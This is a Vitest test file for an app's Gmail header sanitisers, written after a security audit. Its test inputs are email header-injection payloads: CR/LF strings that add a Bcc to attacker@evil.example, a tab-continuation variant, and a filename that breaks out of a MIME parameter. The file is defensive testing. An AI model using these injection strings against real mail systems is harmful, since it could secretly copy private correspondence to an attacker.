/**
 * S5 (2026-09-14 security audit, item 8) — Gmail header injection.
 *
 * The MIME envelope is `lines.join('\r\n')`. Anything carrying a CR or an
 * LF into a header value ends that header and starts another one, so a
 * subject or a display name that reached us from an inbound email could
 * add a Bcc to every reply the venue sent.
 */

import { describe, it, expect } from 'vitest'
import { sanitiseHeaderValue, sanitiseHeaderParam } from '../gmail'

describe('sanitiseHeaderValue', () => {
  it('leaves an ordinary value alone', () => {
    expect(sanitiseHeaderValue('chloe@example.com')).toBe('chloe@example.com')
    expect(sanitiseHeaderValue('Re: your June date')).toBe('Re: your June date')
    expect(sanitiseHeaderValue('"Chloe Barnes" <chloe@example.com>')).toBe(
      '"Chloe Barnes" <chloe@example.com>',
    )
  })

  it('strips an injected Bcc out of a recipient', () => {
    const payload = 'chloe@example.com\r\nBcc: attacker@evil.example'
    const out = sanitiseHeaderValue(payload)
    expect(out).not.toContain('\r')
    expect(out).not.toContain('\n')
    // The text survives as text, on one line — it cannot be a header.
    expect(out.split(/\r?\n/)).toHaveLength(1)
  })

  it('strips a bare LF injection too', () => {
    const out = sanitiseHeaderValue('Your contract\nBcc: attacker@evil.example')
    expect(out.split(/\r?\n/)).toHaveLength(1)
  })

  it('strips the header-continuation trick', () => {
    // A leading tab on the next line continues the previous header, which
    // is the same attack one step round.
    const out = sanitiseHeaderValue('subject\r\n\tBcc: attacker@evil.example')
    expect(out).not.toMatch(/[\r\n\t]/)
  })

  it('ends the header block for nobody', () => {
    const out = sanitiseHeaderValue('subject\r\n\r\nThis would be the body')
    expect(out).not.toMatch(/[\r\n]/)
  })

  it('handles null, undefined and empty', () => {
    expect(sanitiseHeaderValue(null)).toBe('')
    expect(sanitiseHeaderValue(undefined)).toBe('')
    expect(sanitiseHeaderValue('')).toBe('')
    expect(sanitiseHeaderValue('   ')).toBe('')
  })
})

describe('sanitiseHeaderParam', () => {
  it('also drops the quote that would close the parameter early', () => {
    const out = sanitiseHeaderParam('invoice".pdf"; x-evil="1')
    expect(out).not.toContain('"')
  })

  it('neutralises a filename carrying a header break', () => {
    const out = sanitiseHeaderParam('contract.pdf"\r\nBcc: attacker@evil.example')
    expect(out).not.toMatch(/[\r\n"]/)
  })

  it('keeps an ordinary filename readable', () => {
    expect(sanitiseHeaderParam('CW-2706-12 agreement.pdf')).toBe(
      'CW-2706-12 agreement.pdf',
    )
  })
})
